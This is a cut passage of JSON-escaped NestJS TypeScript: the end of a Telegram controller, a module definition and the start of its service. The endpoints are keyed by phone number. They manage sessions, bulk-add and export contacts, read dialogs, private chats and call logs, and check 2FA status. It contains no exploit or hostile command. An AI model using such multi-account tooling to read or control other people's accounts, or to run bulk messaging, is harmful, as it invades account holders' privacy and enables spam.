this.telegramService.createClient(mobile);\n            return this.telegramService.getSessionInfo(mobile);\n        });\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async terminateSession(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.terminateSession(mobile, data);\n        });\n    }\n\n    // Monitoring & Health\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return {\n            status: await this.telegramService.getConnectionStatus()\n        };\n    }\n\n    @Get('monitoring/client/:mobile')\n    @ApiOperation({ summary: 'Get client metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Client metadata retrieved successfully' })\n    async getClientMetadata(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getClientMetadata(mobile);\n        });\n    }\n\n    @Get('monitoring/statistics')\n    @ApiOperation({ summary: 'Get client statistics' })\n    @ApiResponse({ status: 200, description: 'Statistics retrieved successfully' })\n    async getClientStatistics() {\n        return await this.telegramService.getClientStatistics();\n    }\n\n    @Get('monitoring/health')\n    @ApiOperation({ summary: 'Get service health' })\n    @ApiResponse({ status: 200, description: 'Health status retrieved successfully' })\n    async getHealthStatus() {\n        return {\n            connections: await this.telegramService.getConnectionStatus(),\n            statistics: await this.telegramService.getClientStatistics()\n        };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ summary: 'Get call log statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getCallLogStats(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getCallLog(mobile);\n        });\n    }\n\n    // Contact Management \n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ status: 200, description: 'Contacts added successfully' })\n    async addContactsBulk(\n        @Param('mobile') mobile: string,\n        @Body() contactsDto: AddContactsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.addContacts(\n                mobile,\n                contactsDto.phoneNumbers,\n                contactsDto.prefix\n            );\n        });\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contacts retrieved successfully' })\n    async getContacts(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            return client.getContacts();\n        });\n    }\n\n    // Media Operations\n    @Get('media/info/:mobile')\n    @ApiOperation({ summary: 'Get media messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', required: false, enum: MediaType, isArray: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMediaInfo(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: MediaType[],\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\n        });\n    }\n\n    @Post('media/send/:mobile')\n    @ApiOperation({ summary: 'Send media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaDto })\n    async sendMedia(\n        @Param('mobile') mobile: string,\n        @Body() sendMediaDto: SendMediaDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            if (sendMediaDto.type === MediaType.PHOTO) {\n                return client.sendPhotoChat(\n                    sendMediaDto.chatId,\n                    sendMediaDto.url,\n                    sendMediaDto.caption,\n                    sendMediaDto.filename\n                );\n            }\n            return client.sendFileChat(\n                sendMediaDto.chatId,\n                sendMediaDto.url,\n                sendMediaDto.caption,\n                sendMediaDto.filename\n            );\n        });\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ summary: 'Download media from a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'messageId', required: true })\n    async downloadMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('messageId') messageId: number,\n        @Res() res: Response\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\n        });\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ summary: 'Send media album (multiple photos/videos)' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaAlbumDto })\n    async sendMediaAlbum(\n        @Param('mobile') mobile: string,\n        @Body() albumDto: MediaAlbumOptions\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendMediaAlbum(mobile, albumDto);\n        });\n    }\n\n    @Get('media/metadata/:mobile')\n    @ApiOperation({ summary: 'Get media metadata from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ type: MediaSearchDto })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query() searchDto: MediaSearchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMediaMetadata(mobile, searchDto.chatId, searchDto.offset, searchDto.limit);\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ summary: 'Get filtered media messages from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true })\n    @ApiQuery({ name: 'startDate', required: false })\n    @ApiQuery({ name: 'endDate', required: false })\n    @ApiQuery({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'minId', required: false, type: Number })\n    @ApiQuery({ name: 'maxId', required: false, type: Number })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getFilteredMedia(mobile, {\n                chatId,\n                types,\n                startDate: startDate ? new Date(startDate) : undefined,\n                endDate: endDate ? new Date(endDate) : undefined,\n                limit,\n                minId,\n                maxId\n            });\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupMembers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGrpMembers(mobile, groupId);\n        });\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    async blockChat(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.blockUser(mobile, chatId);\n        });\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID to delete', required: true })\n    async deleteChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.deleteChat(mobile, chatId);\n        });\n    }\n\n    // Additional Message Operations\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    async sendMessageWithInlineButton(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n        });\n    }\n\n    // Dialog Management\n    @Get('dialogs/:mobile')\n    @ApiOperation({ summary: 'Get all dialogs' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', description: 'Number of dialogs to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'offsetId', description: 'Number of dialogs to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'archived', description: 'Include archived chats', required: false, type: Boolean })\n    async getAllDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit: number = 500,\n        @Query('offsetId') offsetId: number = 0,\n        @Query('archived') archived: boolean = false\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });\n        });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Last active time retrieved successfully' })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getLastActiveTime(mobile);\n        });\n    }\n\n    // Enhanced Group Management\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async createGroupWithOptions(\n        @Param('mobile') mobile: string,\n        @Body() options: GroupSettingsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createGroupWithOptions(mobile, options);\n        });\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async updateGroupSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: GroupSettingsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateGroupSettings(mobile, settings);\n        });\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async addGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.addGroupMembers(\n                mobile,\n                memberOp.groupId,\n                memberOp.members\n            );\n        });\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async removeGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.removeGroupMembers(\n                mobile,\n                memberOp.groupId,\n                memberOp.members\n            );\n        });\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async handleAdminOperation(\n        @Body() adminOp: AdminOperationDto,\n        @Param('mobile') mobile: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            if (adminOp.isPromote) {\n                return this.telegramService.promoteToAdmin(\n                    mobile,\n                    adminOp.groupId,\n                    adminOp.userId,\n                    adminOp.permissions,\n                    adminOp.rank\n                );\n            } else {\n                return this.telegramService.demoteAdmin(\n                    mobile,\n                    adminOp.groupId,\n                    adminOp.userId\n                );\n            }\n        });\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    async cleanupChat(\n        @Param('mobile') mobile: string,\n        @Body() cleanup: ChatCleanupDto\n    ) {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    }\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('period') period: 'day' | 'week' | 'month' = 'week'\n    ): Promise<ChatStatistics> {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    // Message Scheduling\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    async scheduleMessage(\n        @Param('mobile') mobile: string,\n        @Body() schedule: ScheduleMessageDto\n    ) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    async getScheduledMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getScheduledMessages(mobile, chatId);\n        });\n    }\n\n    // Enhanced Media Operations\n    @Post('media/voice/:mobile')\n    @ApiOperation({ summary: 'Send voice message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendVoiceMessage(\n        @Param('mobile') mobile: string,\n        @Body() voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendVoiceMessage(mobile, voice);\n        });\n    }\n\n    // Advanced Chat Operations\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n        });\n    }\n\n    @Get('session/validate/:mobile')\n    @ApiOperation({ summary: 'Validate session status' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Session status retrieved successfully' })\n    async validateSession(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            const isConnected = await client.connected();\n            if (!isConnected) {\n                await client.connect();\n            }\n            return {\n                isValid: true,\n                isConnected,\n                phoneNumber: client.phoneNumber\n            };\n        });\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async promoteToAdmin(\n        @Param('mobile') mobile: string,\n        @Body() adminOp: AdminOperationDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.promoteToAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId,\n                adminOp.permissions,\n                adminOp.rank\n            );\n        });\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async demoteAdmin(\n        @Param('mobile') mobile: string,\n        @Body() memberOp: GroupMemberOperationDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.demoteAdmin(\n                mobile,\n                memberOp.groupId,\n                memberOp.members[0]\n            );\n        });\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async unblockGroupUser(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            groupId: string;\n            userId: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n        });\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupAdmins(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGroupAdmins(mobile, groupId);\n        });\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupBannedUsers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGroupBannedUsers(mobile, groupId);\n        });\n    }\n\n    // Advanced Contact Management\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    async exportContacts(\n        @Param('mobile') mobile: string,\n        @Body() exportDto: ContactExportImportDto,\n        @Res() res: Response\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            const data = await this.telegramService.exportContacts(\n                mobile,\n                exportDto.format,\n                exportDto.includeBlocked\n            );\n\n            const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n            res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n            res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n            res.send(data);\n        });\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async importContacts(\n        @Param('mobile') mobile: string,\n        @Body() contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.importContacts(mobile, contacts);\n        });\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    async manageBlockList(\n        @Param('mobile') mobile: string,\n        @Body() blockList: ContactBlockListDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.manageBlockList(\n                mobile,\n                blockList.userIds,\n                blockList.block\n            );\n        });\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contact statistics retrieved successfully' })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getContactStatistics(mobile);\n        });\n    }\n\n    // Chat Folder Management\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    async createChatFolder(\n        @Param('mobile') mobile: string,\n        @Body() folder: CreateChatFolderDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createChatFolder(mobile, folder);\n        });\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChatFolders(mobile);\n        });\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async editMessage(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.editMessage(mobile, options);\n        });\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updateChatSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateChatSettings(mobile, settings);\n        });\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendMediaBatch(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendMediaBatch(mobile, options);\n        });\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.hasPassword(mobile);\n        });\n    }\n\n    @Get('chats/:mobile')\n    @ApiOperation({ summary: 'Get chats with advanced filtering' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('offsetId') offsetId?: number,\n        @Query('offsetPeer') offsetPeer?: string,\n        @Query('folderId') folderId?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChats(mobile, {\n                limit,\n                offsetDate,\n                offsetId,\n                offsetPeer,\n                folderId\n            });\n        });\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getFileUrl(\n        @Param('mobile') mobile: string,\n        @Query('url') url: string,\n        @Query('filename') filename: string\n    ): Promise<string> {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getFileUrl(mobile, url, filename);\n        });\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getMessageStats(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessageStats(mobile, options);\n        });\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ summary: 'Get top 5 private chats with detailed statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getTopPrivateChats(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getTopPrivateChats(mobile);\n        });\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { ConnectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'CONNECTION_MANAGER',\n            useValue: ConnectionManager.getInstance()\n        },\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: TelegramLogger.getInstance()\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\nimport { UsersService } from '../users/users.service';\nimport { contains, sleep } from \"../../utils\";\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { Api, TelegramClient } from 'telegram';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { TelegramError, TelegramErrorCode } from './types/telegram-error';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { ConnectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { DialogsQueryDto } from './dto/metadata-operations.dto';\nimport { ClientMetadataTracker } from './utils/client-metadata';\nimport { ClientMetadata } from './types/client-operations';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private static clientsMap: Map<string, TelegramManager> = new Map();\n    private readonly connectionManager: ConnectionManager;\n    private readonly logger: TelegramLogger;\n    private readonly metadataTracker: ClientMetadataTracker;\n    private cleanupInterval: NodeJS.Timer;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.connectionManager = ConnectionManager.getInstance();\n        this.logger = TelegramLogger.getInstance();\n        this.metadataTracker = 